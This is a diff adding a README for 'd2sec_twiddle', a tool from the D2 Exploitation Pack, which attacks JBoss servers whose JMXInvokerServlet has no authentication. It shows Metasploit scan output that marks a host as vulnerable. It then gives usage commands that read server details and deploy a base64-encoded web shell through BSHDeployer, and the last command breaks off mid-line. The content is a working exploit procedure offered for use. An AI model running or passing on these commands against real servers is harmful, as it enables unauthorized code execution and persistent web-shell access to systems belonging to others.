@@ -1,0 +1,49 @@
+D2 Exploitation Pack
+
+Copyright (c) 2007-2014 DSquare Security, LLC
+All rights reserved.
+
+License information
+---------------------
+
+See the file "LICENSE.txt" for information on the history of this
+software, terms & conditions for usage, and a DISCLAIMER OF ALL
+WARRANTIES.
+
+Description
+-------------
+
+d2sec_twiddle is a tool to use when the Jboss JMXInvokerServlet invoker is up
+without authentication. For example :
+
+msf  auxiliary(jboss_vulnscan) > set RHOST 10.0.0.1
+RHOST => 10.0.0.1
+msf  auxiliary(jboss_vulnscan) > set RPORT 8080
+RPORT => 8080
+msf  auxiliary(jboss_vulnscan) > run
+
+[*] Apache-Coyote/1.1 ( Powered by Servlet 2.4; JBoss-4.0.4.GA (build: CVSTag=JBoss_4_0_4_GA date=200605151000)/Tomcat-5.5 )
+[*] 10.55.133.211:8080 Checking http...
+[*] 10.55.133.211:8080 Don't know how to handle response code 500
+[+] 10.55.133.211:8080 /status does not require authentication (200)
+[*] 10.55.133.211:8080 Don't know how to handle response code 500
+[+] 10.55.133.211:8080 /web-console/Invoker does not require authentication (200)
+[+] 10.55.133.211:8080 /invoker/JMXInvokerServlet does not require authentication (200)  <-- vulnerable !!!!
+[*] 10.55.133.211:8080 Checking services...
+[*] 10.55.133.211:8080 Naming Service tcp/1098: open
+[*] 10.55.133.211:8080 Naming Service tcp/1099: open
+[*] 10.55.133.211:8080 RMI invoker tcp/4444: open
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+Usage
+------
+
+To get the version:
+
+$ java -jar d2sec_twiddle.jar -s http://localhost:8080/invoker/JMXInvokerServlet -v get jboss.system:type=ServerInfo OSVersion
+OSVersion=2.6.9-42.ELsmp
+
+To deploy a war file:
+
+$ java -jar d2sec_twiddle.jar -s http://localhost:8088/invoker/JMXInvokerServlet -v invoke jboss.deployer:service=BSHDeployer createScriptDeployment 'import java.io.FileOutputStream;import sun.misc.BASE64Decoder;String webshell = "ZIP_EN_BASE64";BASE64Decoder decoder = new BASE64Decoder();byte[] byteval = decod &
